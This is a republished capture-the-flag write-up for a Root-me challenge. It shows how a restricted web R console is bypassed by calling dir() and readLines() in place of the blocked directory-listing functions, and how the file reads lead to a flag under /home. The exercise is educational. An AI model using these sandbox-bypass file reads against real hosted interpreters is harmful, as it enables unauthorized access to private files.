# R Code Execution - root-me.org

> Writeup by [Alex Buschinelli](https://alexbsec.github.io/R-command-execution-root-me) — republished with permission for educational purposes.

## Introduction

Long time no see! It's been a while since I last posted. But now that we are back, let's solve another Root-me CTF! This time, we are going to attack the R: Command Execution, under the app. I never programmed in R before, so this might be a tricky one for me. We might need to do a good research on this.

## Challenge description

> Your Statistical Analysis Reviews in R are approaching. Your teacher has made an R interpreter available on the ENT of the university so that you can practice. You don't have time to revise, you decide to steal the exam papers.

We are playing the cheater's role this time. To start this challenge, we need to click on a button "Start the challenge". No need to ssh this time. After clicking the button, we arrive at a R console.

## Approach

### Step 1 - Understanding basic concepts

In R, when we define a function:

```
my_func <- function() {
    print("Hi mom")
}
```

we call it by writing `my_func()`. However, if we instead write `my_func`, we will get the function gist instead.

`ls()` is a function and we got its definition when we typed in `ls` without the (). Another interesting thing we can use here is the `?` operator. If we type in `?<function>`, we get the function's documentation.

We can check which functions we can use with `ls()` — we see a list of functions. Our objective is to retrieve the exam file.

From the `ls()` output, we might want to use `list.dirs` to check directory contents, but these functions are overwritten with custom message functions that block us.

### Step 2 - Understanding the problem

1. We need to find the exam file, but we cannot use the standard functions.
2. We need to find other ways to list directories and read files.

After research, I found the `dir()` function which is an alias to `list.files`. This function is properly defined and we can use it to list files:

```
dir(path = ".", pattern = NULL, all.files = FALSE, full.names = FALSE, recursive = FALSE)
```

We found we are inside `/var/www/html` directory. To read files, we can use `readLines`:

```
data <- readLines(con="index.php")
print(data)
```

### Step 3 - Crafting the attack

Let's use `dir()` to navigate:

```
dir(path = "/")
```

Shows the `/` directory. In CTFs, flags are usually inside the home directory:

```
dir(path = "/home")
dir(path = "/home/flag")
dir(path = "/home/flag/2021")
```

There we have it! Our flag.txt file!

### Step 4 - Solving!

To solve this, we just need to read the flag.txt contents:

```
data <- readLines(con = "/home/flag/2021/flag.txt")
print(data)
```

And there we have it. Our flag!

## Conclusion

In this CTF we learned more about R programming language and how a cheater might do anything to circumvent system security to pass an exam! This was an amazing CTF, where we put into test our abilities to adapt and find ways through new environments.

> **Flag:** Retrieved from `/home/flag/2021/flag.txt`

---

*Writeup originally by [Alex Buschinelli](https://alexbsec.github.io/R-command-execution-root-me)*
